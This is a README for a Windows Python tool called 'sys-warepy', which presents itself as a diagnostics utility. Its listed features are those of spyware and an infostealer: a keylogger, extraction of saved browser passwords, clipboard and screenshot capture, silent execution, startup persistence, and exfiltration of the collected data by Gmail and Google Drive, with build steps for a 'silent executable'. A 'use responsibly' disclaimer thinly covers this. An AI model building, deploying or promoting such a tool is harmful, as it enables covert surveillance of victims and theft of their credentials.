# sys-warepy

A comprehensive Windows system information collector that gathers detailed system data, browser history, clipboard contents, screenshots, keylogger logs, network diagnostics, and more. This tool is designed for system monitoring and diagnostics.

## Features

- **System Information**: Collects detailed hardware and software specs
- **Browser Data**: Extracts browsing history and saved passwords
- **Clipboard Monitoring**: Captures clipboard contents
- **Screenshots**: Takes screen captures
- **Keylogger**: Records keystrokes (use responsibly)
- **Network Diagnostics**: Performs network scans and checks
- **File System Analysis**: Gathers file and directory information
- **Process Monitoring**: Lists running processes
- **USB Device Tracking**: Monitors USB device connections
- **Email Reporting**: Sends collected data via Gmail
- **Google Drive Upload**: Uploads reports to Google Drive
- **Startup Integration**: Can install/uninstall from Windows startup

## Usage

- Run silently: `python sysinfo.py` or `dist\sys.exe`
- Run auto mode explicitly: `dist\sys.exe --auto`
- Run interactive mode: `dist\sys.exe --menu`
- Install to startup: `dist\sys.exe --install`
- Uninstall from startup: `dist\sys.exe --uninstall`

## Configuration

Set your Gmail app password as an environment variable before sending email (or it uses the default configured password):

```powershell
set GMAIL_APP_PASSWORD=your_app_password
```

Configure Google Drive credentials for file upload:

```powershell
set GOOGLE_APPLICATION_CREDENTIALS=C:\path\to\service_account.json
set GOOGLE_DRIVE_FOLDER_ID=your_drive_folder_id
```

## Requirements

- Python 3.x
- Required packages: Install via `pip install -r requirements.txt` (if available)
- Gmail account with App Password enabled
- Google Drive API credentials (optional)

## Build

Build the silent executable using:

```powershell
python build_exe.py
```

The resulting executable is created at `dist\sys.exe`.

## Security Note

This tool collects sensitive system information. Use responsibly and ensure compliance with applicable laws and regulations.
